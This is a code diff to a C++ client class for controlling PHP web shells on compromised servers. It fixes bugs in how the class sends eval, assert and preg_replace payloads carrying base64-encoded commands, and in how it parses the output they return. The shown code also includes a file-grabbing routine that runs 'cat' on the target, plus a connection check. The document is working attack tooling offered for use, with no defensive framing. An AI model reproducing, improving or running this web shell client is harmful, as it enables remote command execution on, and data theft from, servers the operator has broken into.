@@ -26,7 +26,7 @@ CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonpa
 	string  mark = to_string(1000*rand());
 	string evalphp;
 	if (find(disabled_functions.begin(), disabled_functions.end(), "eval") == disabled_functions.end())
-		evalphp = "print_r($_POST);print urlencode($_POST['YQ==']);@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";eval(base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']));echo \"" + mark + "\";";
+		evalphp = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";eval(base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']));echo \"" + mark + "\";";
 	else if(find(disabled_functions.begin(), disabled_functions.end(), "assert") == disabled_functions.end())
 		evalphp = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";assert(base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']));echo \"" + mark + "\";";
 	else if(find(disabled_functions.begin(), disabled_functions.end(), "preg_replace") == disabled_functions.end())
@@ -57,8 +57,9 @@ CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonpa
 		switch (Method) {
 		case GET:
 			params[pass] = curlhelper::UrlEncode(evalphp);
+			break;
 		case POST:
-			params[pass] = curlhelper::UrlEncode(evalphp);
+			postparams[pass] = curlhelper::UrlEncode(evalphp);
 		default:
 			break;
 		}
@@ -86,8 +87,7 @@ CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonpa
 	//cout << websitecallback << endl;
 	size_t beginindex = websitecallback.find(mark);
 	if (beginindex != string::npos) {
-		size_t endindex = websitecallback.find_last_of(mark,beginindex+mark.size());
-		if(endindex==beginindex)endindex=websitecallback.size()-1;
+		size_t endindex = websitecallback.find(mark,beginindex+mark.size());
 		if (endindex == string::npos)endindex = websitecallback.size() - 1;
 		ans = websitecallback.substr(beginindex + mark.size(), endindex - beginindex -mark.size());
 		//cout << ans << endl;
@@ -365,7 +365,7 @@ CURLcode WebShell::GetFile(string filename, string downname) {
 		else {
 			string ans;
 			CURLcode c=ShellCommandExec("cat " + filename, ans);
-			fstream f((const char*)(downname.c_str()), ios::out|ios::binary);
+			fstream f(downname.c_str(), ios::out|ios::binary);
 			f.write((char*)(ans.data()), sizeof(char)*(ans.size()));
 			f.close();
 			return c;
@@ -414,7 +414,7 @@ CURLcode WebShell::GetFile(string filename, string downname) {
 			""
 			"function getRelativePath($from, $to) {"
 			"  // some compatibility fixes for Windows paths"
-			"  $from = rtrim($from, '\\/') . '/';"
+			"  $from = rtrim($from, '\/') . '/';"
 			"  $from = str_replace('\\', '/', $from);"
 			"  $to   = str_replace('\\', '/', $to);"
 			""
@@ -527,8 +527,7 @@ void WebShell::addAddonPost(string post, string param) {
 }
 bool WebShell::check_connection() {
 	string ans;
-	php_exec("echo 'whats_the_fuck';", ans);
-	cout<<ans<<endl;
+	php_exec("echo 'whats_the_fuck'", ans);
 	return (ans == "whats_the_fuck");
 }
 WebShell::~WebShell()
